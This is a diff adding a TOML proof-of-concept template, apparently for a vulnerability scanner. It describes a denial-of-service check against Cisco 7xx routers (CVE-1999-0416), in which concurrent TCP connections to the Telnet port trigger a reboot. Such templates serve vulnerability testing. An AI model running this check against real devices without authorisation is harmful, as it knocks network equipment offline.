@@ -1,0 +1,22 @@
+[info]
+id = "POC-AVE-1999-0201"
+name = "Cisco 7xx Telnet DoS PoC"
+author = "AVE"
+severity = "medium"
+tags = ["dos", "cisco", "telnet", "router"]
+description = "通过向 Cisco 7xx 路由器 TELNET 端口发起大量并发 TCP 连接，导致路由器自动重启，造成拒绝服务。"
+vuln_id = ["CVE-1999-0416", "AVE-1999-0201"]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "TCP"
+host = "{{target}}"
+port = 23
+description = "向目标 TELNET 端口发起多个并发 TCP 连接以触发 DoS"
+
+[[poc.requests.matchers]]
+type = "connection"
+expect = "timeout"
+description = "连接成功但路由器可能重启导致连接中断"
